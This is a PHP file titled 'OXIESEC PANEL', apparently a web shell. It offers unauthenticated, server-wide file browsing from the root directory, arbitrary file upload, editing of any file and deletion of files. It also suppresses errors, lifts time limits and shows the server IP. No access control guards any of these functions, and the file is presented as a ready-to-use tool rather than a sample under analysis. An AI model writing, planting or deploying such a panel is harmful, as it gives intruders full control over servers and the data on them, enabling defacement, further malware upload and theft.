<?php
error_reporting(0);
set_time_limit(0);

$config = [
    'show_ip' => true,
    'max_file_size' => 10485760
];

$current_dir = realpath($_GET['dir'] ?? '/') ?: '/';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        $dest = $current_dir . '/' . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
            $msg = "File uploaded successfully.";
        } else {
            $msg = "Upload failed.";
        }
    }
    if (isset($_POST['save_file']) && isset($_POST['file_content']) && isset($_POST['edit_file'])) {
        file_put_contents($_POST['edit_file'], $_POST['file_content']);
        $msg = "File saved.";
    }
}

if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target) && unlink($target)) {
        $msg = "File deleted.";
    }
}

function breadcrumbs($path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $crumbs = [];
    $accum = '';
    $crumbs[] = "<a href='?dir=%2F'>/</a>";
    foreach ($parts as $part) {
        if ($part === '') continue;
        $accum .= DIRECTORY_SEPARATOR . $part;
        $crumbs[] = "<a href='?dir=" . urlencode($accum) . "'>$part</a>";
    }
    return implode(" / ", $crumbs);
}

function perms($file) {
    $perms = fileperms($file);
    $s = (($perms & 0x0100) ? 'r' : '-') .
         (($perms & 0x0080) ? 'w' : '-') .
         (($perms & 0x0040) ? 'x' : '-') .
         (($perms & 0x0020) ? 'r' : '-') .
         (($perms & 0x0010) ? 'w' : '-') .
         (($perms & 0x0008) ? 'x' : '-') .
         (($perms & 0x0004) ? 'r' : '-') .
         (($perms & 0x0002) ? 'w' : '-') .
         (($perms & 0x0001) ? 'x' : '-');
    return $s;
}

$edit_file = $_GET['edit'] ?? null;
$server_ip = $_SERVER['SERVER_ADDR'];
$files = scandir($current_dir);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>OXIESEC PANEL</title>
<style>
body { margin:0; background:#111; color:#eee; font-family:monospace; height:100vh; display:flex; flex-direction:column; font-size:10px; }
.header { background:#222; padding:6px; display:flex; justify-content:space-between; align-items:center; }
.header-title {
    font-size:16px;
    font-weight:bold;
}
.main { flex:1; display:flex; height:calc(100vh - 46px); }
.sidebar { flex:1; overflow:auto; background:#181818; padding:6px; box-sizing:border-box; }
.editor-pane { flex:1; display:flex; flex-direction:column; border-left:1px solid #333; }
.editor-header { background:#222; padding:4px 8px; display:flex; justify-content:space-between; align-items:center; font-size:10px; }
textarea { flex:1; width:100%; background:#000; color:#fff; border:none; resize:none; padding:6px; box-sizing:border-box; font-size:10px; }
table { width:100%; border-collapse:collapse; background:#1c1c1c; margin-top:6px; font-size:10px; }
th, td { padding:4px; border-bottom:1px solid #333; }
a { color:#80d0ff; text-decoration:none; }
button, input[type=submit] { background:#333; color:#fff; border:none; padding:3px 6px; cursor:pointer; font-size:10px; }
.success { color:#4caf50; }
.error { color:#f44336; }
.editor-buttons { display:flex; gap:6px; align-items:center; }
</style>
</head>
<body>
<div class="header">
    <div>
        <span class="header-title">OXIESEC PANEL</span> - Current Dir: <?= breadcrumbs($current_dir) ?>
    </div>
    <div>
        <span>Server IP: <?= $server_ip ?></span>
    </div>
</div>
<div style="padding:4px; background:#222;">
    <form method="post" enctype="multipart/form-data" style="margin:0;">
        Upload: <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    <?= isset($msg) ? "<div class='success'>$msg</div>" : "" ?>
</div>
<div class="main">
    <div class="sidebar">
        <table>
            <tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th>Actions</th></tr>
            <?php foreach ($files as $f):
                if ($f === '.') continue;
                $p = $current_dir . DIRECTORY_SEPARATOR . $f;
                $isdir = is_dir($p);
                $size = $isdir ? '-' : formatSize(filesize($p));
                $time = date("m/d/Y h:i:s A", filemtime($p));
                ?>
                <tr>
                    <td>
                        <?= $isdir ? "📁 <a href='?dir=" . urlencode($p) . "'>$f</a>" :
                                     "📄 <a href='?dir=" . urlencode($current_dir) . "&edit=" . urlencode($p) . "'>$f</a>" ?>
                    </td>
                    <td><?= $size ?></td>
                    <td><?= $time ?></td>
                    <td><?= perms($p) ?></td>
                    <td>
                        <?php if (!$isdir): ?>
                        <a href="?delete=<?= urlencode($p) ?>&dir=<?= urlencode($current_dir) ?>" style="color:#f44336;">Delete</a>
                        <?php endif; ?>
                    </td>
                </tr>
            <?php endforeach; ?>
        </table>
    </div>
    <?php if ($edit_file && is_file($edit_file)): ?>
    <div class="editor-pane">
        <form method="post" style="flex:1; display:flex; flex-direction:column; margin:0;">
            <div class="editor-header">
                <div>Editing: <?= htmlspecialchars(basename($edit_file)) ?></div>
                <div class="editor-buttons">
                    <input type="submit" name="save_file" value="Save Changes" style="background:#4caf50;">
                    <a href="?dir=<?= urlencode($current_dir) ?>"><button type="button">Close</button></a>
                </div>
            </div>
            <textarea name="file_content"><?= isset($_POST['file_content']) ? htmlspecialchars($_POST['file_content']) : htmlspecialchars(file_get_contents($edit_file)) ?></textarea>
            <input type="hidden" name="edit_file" value="<?= htmlspecialchars($edit_file) ?>">
        </form>
    </div>
    <?php endif; ?>
</div>
</body>
</html>

<?php
function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return round($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return round($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return round($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return $bytes . ' byte';
    } else {
        return '0 bytes';
    }
}
?>

